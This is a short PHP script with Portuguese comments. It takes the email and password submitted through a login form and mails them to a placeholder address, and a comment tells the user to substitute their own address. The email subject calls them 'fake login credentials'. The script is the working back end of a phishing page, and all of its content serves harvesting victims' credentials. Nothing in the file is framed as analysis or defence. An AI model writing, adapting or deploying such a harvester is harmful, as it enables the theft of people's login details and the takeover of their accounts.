<?php
    $email = $_POST['email'];
    $password = $_POST['password'];

    $to = "elyezerpc@example.com"; // Substitua pelo seu endereço de e-mail
    $subject = "Credenciais de Login Falsas";
    $message = "E-mail: $email\nSenha: $password\n";

    mail($to, $subject, $message);
?>
